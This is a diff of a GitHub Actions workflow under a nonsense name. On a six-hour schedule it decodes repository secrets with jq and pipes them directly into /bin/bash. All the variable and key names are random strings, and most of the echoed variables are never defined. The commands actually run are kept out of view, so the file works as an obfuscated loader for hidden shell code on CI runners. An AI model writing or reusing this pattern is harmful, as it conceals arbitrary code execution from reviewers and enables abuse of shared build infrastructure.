@@ -1,26 +1,23 @@
 name: stronglyreiterate
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
+    - cron: '54 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: stronglyreiterate
         env:
-          drwhe9364: ${{ secrets.drwhe9364 }}
+          jrb4751: ${{ secrets.jrb4751 }}
         run: |
-          echo $drwhe9364 | jq -r .hrcmm31674 | /bin/bash
-          echo $kj6234 | jq -r .uubm952 | /bin/bash
-          echo $mn41503 | jq -r .isbzj2835 | /bin/bash
-          echo $eteam0 | jq -r .fzg1 | /bin/bash
-          echo $ixpd92086 | jq -r .hc15160 | /bin/bash
-          echo $bji57581 | jq -r .ja536 | /bin/bash
-          echo $ax10 | jq -r .yuxhf2 | /bin/bash
-          echo $hv79737 | jq -r .d029 | /bin/bash
-          echo $yuwr62022 | jq -r .ctl04857 | /bin/bash
-          echo $flm99071 | jq -r .zpt83 | /bin/bash
-          echo $t985 | jq -r .vlek2951 | /bin/bash
+          echo $jrb4751 | jq -r .yg0558 | /bin/bash
+          echo $py3165 | jq -r .kcws99573 | /bin/bash
+          echo $zj92 | jq -r .zcw2 | /bin/bash
+          echo $nvky25 | jq -r .o22543 | /bin/bash
+          echo $kjhzh464 | jq -r .lxa93 | /bin/bash
 
